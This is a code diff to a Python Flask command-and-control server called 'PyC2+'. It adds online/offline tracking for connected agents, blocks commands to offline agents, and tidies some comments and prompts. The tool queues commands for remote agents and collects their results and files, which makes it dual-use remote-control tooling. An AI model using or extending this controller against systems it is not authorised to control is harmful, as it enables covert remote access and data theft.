@@ -10,6 +10,7 @@ import os
 import json
 import os
 import platform
+import readline
 
 # Disable Flask logging in terminal (noise)
 log = logging.getLogger('werkzeug')
@@ -67,6 +68,11 @@ def save_file(agent_id, filename, b64data):
 
     return filepath
 
+# Check if agent is still online (every 10 seconds, can be adjusted)
+def agent_online(agent_id):
+    return (time.time() - agents[agent_id]["last_seen"]) < 10
+
+
 # FLASK ENDPOINTS
 @app.route("/register", methods=["POST"])
 def register():
@@ -74,7 +80,7 @@ def register():
         return "Unauthorized", 401
 
     agent_id = str(uuid.uuid4())
-    agents[agent_id] = {"registered_at": timestamp()}
+    agents[agent_id] = {"registered_at": timestamp(), "last_seen": time.time()}  # NEW
     tasks[agent_id] = Queue()
     results[agent_id] = []
 
@@ -88,6 +94,8 @@ def get_task(agent_id):
 
     if agent_id not in agents:
         return "Unknown agent", 404
+
+    agents[agent_id]["last_seen"] = time.time()  # NEW
 
     if not tasks[agent_id].empty():
         return jsonify({"task": tasks[agent_id].get()})
@@ -115,7 +123,7 @@ def receive_result(agent_id):
 
     content = request.data.decode()
 
-    # Check if a file result from agent
+    # Check if this is a file result from agent
     try:
         parsed = json.loads(content)
         if parsed.get("type") == "file":
@@ -154,7 +162,7 @@ def history(agent_id):
 def cli():
     time.sleep(1)
 
-    # Print CLI banner
+    # Print banner
     print("\n" + "="*50)
     print("                 PyC2+ CLI")
     print("="*50)
@@ -166,8 +174,8 @@ def cli():
     def get_prompt():
         """Return prompt showing selected agent."""
         if selected:
-            return f"[PyC2+ | {selected}]> "
-        return "[PyC2+]> "
+            return f"\n[PyC2+ | {selected}]> "
+        return "\n[PyC2+]> "
 
     while True:
         try:
@@ -179,7 +187,7 @@ def cli():
         if not cmd:
             continue
 
-        # Help menu
+        # Help
         if cmd.lower() == "help":
             print("\nAvailable commands:")
             print("  agents                   - list all agents")
@@ -199,7 +207,8 @@ def cli():
             else:
                 print("\nConnected agents:")
                 for a in agents.keys():
-                    print(f"  {a}")
+                    status = "online" if agent_online(a) else "offline"   # NEW
+                    print(f"  {a} [{status}]")
             continue
 
         # Select agent
@@ -256,13 +265,16 @@ def cli():
                 continue
 
             command = cmd[len("send "):]
+
+            if not agent_online(selected):
+                print("Agent is offline — cannot send command.")
+                continue
+
             tasks[selected].put(command)
 
-            # Run locally and print output
             output = run_local(command)
             print(output)
 
-            # Store in history
             results[selected].append({"timestamp": timestamp(), "result": output})
             continue
 
